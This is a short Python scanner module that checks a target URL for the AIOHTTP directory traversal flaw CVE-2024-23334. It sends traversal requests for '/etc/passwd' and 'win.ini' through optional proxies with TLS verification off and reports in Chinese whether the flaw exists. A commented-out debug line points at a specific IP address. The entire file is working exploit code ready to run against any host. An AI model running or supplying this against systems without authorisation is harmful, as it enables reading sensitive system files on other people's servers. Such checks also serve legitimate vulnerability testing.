import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        gf = requests.get(url+'static/../../../../etc/passwd',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf1 = requests.get(url + 'statictest/../C:\windows\win.ini', cookies=s_cookie, headers=headers, proxies=proxies,verify=False)
        if gf.status_code == 200 and "root:x" in gf.text:
            uia = '[+]漏洞存在\nstatic/../../../../etc/passwd'
        elif gf1.status_code == 200 and "[fonts]" in gf1.text:
            uia = '[+]漏洞存在\nstatictest/../C:\windows\win.ini'
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('http://180.188.196.58:8086/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ AIOHTTP 目录穿越 CVE-2024-23334 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)